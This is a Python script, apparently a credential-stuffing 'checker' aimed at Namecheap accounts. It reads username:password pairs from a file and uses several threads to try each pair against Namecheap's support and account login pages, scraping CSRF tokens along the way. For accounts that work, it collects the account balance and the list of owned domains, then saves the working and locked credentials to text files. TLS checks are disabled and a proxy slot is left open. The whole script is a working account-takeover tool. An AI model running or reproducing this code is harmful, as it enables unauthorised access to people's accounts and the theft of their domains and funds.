# -*- coding: utf-8 -*-
import requests
import re
import Queue
import codecs
import os
import time
import base64
from threading import Thread
from Crypto.Cipher import AES

requests.packages.urllib3.disable_warnings()


def check(q):
    while True:
        try:
            c = q.get()
            user = c.split(':')[0]
            passw = c.split(':')[1]
            work = False
            proxy = {
            }
            s = requests.session()
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
                'Origin': 'https://support.namecheap.com',
                'Accept-Encoding': 'gzip'
            }
            r = s.get(
                        'https://support.namecheap.com/index.php',
                        verify=False,
                        headers=headers,
                        proxies=proxy
                    )
            csrf = re.findall('_csrfhash" value="(.*?)"', r.text)
            data = '_redirectAction=&_csrfhash={0}&scemail={1}&scpassword={2}'.format(csrf[0], user, passw)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            r = s.post(
                        'https://support.namecheap.com/index.php?/Base/User/Login',
                        data,
                        verify=False,
                        headers=headers,
                        proxies=proxy
                    )
            
            if 'Change Password' in r.text:
                work = True
            if work:
                r = s.get(
                            'https://namecheap.com/',
                            verify=False,
                            headers=headers,
                            proxies=proxy
                        )
                data = 'LoginUserName={0}&LoginPassword={1}&hidden_LoginPassword='.format(user, passw)
                r = s.post(
                            'https://www.namecheap.com/myaccount/login.aspx',
                            data,
                            verify=False,
                            headers=headers,
                            proxies=proxy
                        )
                if 'Your account has been locked for' in r.text:
                    print user, 'is locked'
                    f = open("locked.txt", "a")
                    f.write(c + '\n')
                    f.close()
                elif 'Last logged in ' in r.text:
                    r = s.get(
                                'https://ap.www.namecheap.com/Domains/DomainList',
                                verify=False,
                                headers=headers,
                                proxies=proxy
                            )
                    headers['Accept'] = 'application/json, text/plain, */*'
                    headers['_NcCompliance'] = 'f6a17922-dbc1-4f29-9f43-4f7c9b523102'
                    del headers['Origin']
                    data = '{"gridStateModel":{"ServerChunkSize":1000,"LastAvailableChunkIndex":0,"IsLazyLoading":true,"TotalServerItemsCount":null},"isOverViewPage":"false"}'
                    r = s.post(
                                'https://ap.www.namecheap.com/Domains/GetDomainList',
                                data,
                                verify=False,
                                headers=headers,
                                proxies=proxy
                            )
                    domains = re.findall('\[0,"(.*?)"', r.text)
                    r = s.get(
                                'https://ap.www.namecheap.com/dashboard/GetBulkModifications/',
                                verify=False,
                                headers=headers,
                                proxies=proxy
                            )
                    bal = re.findall('AccountBalance":(.*?),', r.text)
                    print user, 'is working!'
                    data = "{0} - {1}\nDomains:\n".format(c, str(bal[0]))
                    if domains:
                        for domain in domains:
                            data += "\t{0}\n".format(domain)
                    else:
                        data += "\tNo Domains Found\n"
                    data += "\n"
                    f = open("working.txt", "a")
                    f.write(data)
                    f.close()
            else:
                print user, 'does not work!'
            time.sleep(0.005)
        except Exception, e:
            print e
            raw_input("Please Send Me The Error Message!")
        q.task_done()
    
def main():
    with codecs.open('accounts.txt', 'r', encoding='utf-8') as f:
        users = f.readlines()
    with codecs.open('threads.txt', 'r', encoding='utf-8') as f:
        threads = f.read()
        
    queue = Queue.Queue()
    if int(threads) > 10:
        print "Max threads is 10, changing to 10!"
        threads = 10
    for _ in range(int(threads)):
        worker = Thread(target=check, args=(queue,))
        worker.start()
    for user in users:
        queue.put(user.strip().encode('ascii', 'ignore'))
            
if __name__ == '__main__':
    main()